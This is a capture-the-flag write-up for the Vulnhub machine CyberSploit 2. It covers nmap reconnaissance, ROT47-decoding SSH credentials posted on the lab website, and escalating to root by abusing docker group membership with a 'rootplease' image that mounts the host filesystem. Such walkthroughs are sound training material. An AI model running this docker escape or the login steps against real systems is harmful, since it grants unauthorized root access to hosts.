---
title: Vulnhub - CyberSploit 2
description: My writeup on CyberSploit 2 box.
categories:
 - vulnhub
tags: vulnhub rot47 docker
---

![](https://www.ubackground.com/_ph/11/175205427.jpg)

Hi all, let's pwn it!

You can find the machine there > [CyberSploit 2](https://www.vulnhub.com/entry/cybersploit-2,511/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.19
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 00:04 EEST
Nmap scan report for 192.168.1.19 (192.168.1.19)
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:56:84:35 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
$ nmap -p 22,80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 00:09 EEST
Nmap scan report for 192.168.1.19 (192.168.1.19)
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CyberSploit2
MAC Address: 00:0C:29:56:84:35 (VMware)
```

## Decoding ROT47 - shell as shailendra

Website has some usernames/passwords:

![](https://i.imgur.com/W7rQkbp.png)

We can see 2 weird strings -> D92:=6?5C2 - 4J36CDA=@:E` that's ROT47 let's decode them using [cyberchef](https://gchq.github.io/CyberChef/)

D92:=6?5C2 -> shailendra

4J36CDA=@:E` -> cybersploit1

Tried them with SSH & i got in! `shailendra:cybersploit1`:

```
$ ssh shailendra@$ip
[shailendra@192 ~]$ whoami
shailendra
```

## shailendra -> root

Now privesc is simple user is member of docker group:

```
[shailendra@192 ~]$ id
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker)
```

Let's get root shell:

```
shailendra@192 ~]$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
Unable to find image 'chrisfosterelli/rootplease:latest' locally
latest: Pulling from chrisfosterelli/rootplease
a4a2a29f9ba4: Downloading [===================>                               ]  10.86MB/28.56MB
127c9761dcba: Download complete 
d13bf203e905: Download complete                                                                                                                                                         a4a2a29f9ba4: Pull complete 
127c9761dcba: Pull complete 
d13bf203e905: Pull complete 
4039240d2e0b: Pull complete 
16a91ffa6f29: Pull complete 
Digest: sha256:eb6be3ee1f9b2fd6e3ae6d4fda81a80bfdf21aad9bde6f1a5234f1baa58d4bb3
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
sh-4.4# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Now let's read the flag:

```
sh-4.4# cat flag.txt 
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
```

Meme :P
